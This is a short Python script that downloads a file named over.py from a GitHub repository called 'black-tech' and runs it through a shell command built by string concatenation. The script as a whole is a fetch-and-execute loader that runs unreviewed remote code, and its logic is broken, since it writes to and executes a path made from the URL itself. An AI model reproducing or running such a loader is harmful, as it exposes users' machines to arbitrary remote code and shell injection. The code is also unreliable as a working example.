import subprocess
from urllib.request import urlopen

url = 'https://raw.githubusercontent.com/cicadoves/black-tech/main/over.py'

open(url, 'w').write(urlopen(url).read().decode())
subprocess.run('python '+url, shell=True)
